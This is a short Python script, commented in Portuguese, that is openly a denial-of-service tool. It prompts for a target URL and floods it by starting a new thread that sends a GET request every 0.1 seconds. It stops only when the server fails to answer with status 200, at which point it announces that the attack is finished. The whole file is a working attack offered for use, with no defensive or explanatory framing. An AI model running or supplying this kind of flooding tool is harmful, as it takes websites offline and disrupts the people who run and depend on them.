#!/urs/bin/python3

import requests
import threading
import time

# Função que envia uma requisição GET para a URL especificada
def send_request(url):
    try:
        response = requests.get(url)
        print(f"Requisição enviada: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao enviar requisição: {e}")

# Função que inicia o ataque
def attack(url):
    threads = []
    while True:
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # Pequena pausa para evitar sobrecarga instantânea

        # Verificar se o sistema ainda está respondendo
        try:
            response = requests.get(url, timeout=1)
            if response.status_code != 200:
                print("\033[31;1mSistema não está respondendo. Finalizando...\033[m")
                break
        except requests.exceptions.RequestException:
            print("\033[31;1mSistema não está respondendo. Ataque finalizado.\033[m")
            break

if __name__ == "__main__":
    target_url = input("Digite a URL do servidor alvo (ex: http://example.com): ")
    
    print("\033[32;1mIniciando ataque DoS...\033[m")
    attack(target_url)
    print("\033[32;1mAtaque finalizado.\033[m")
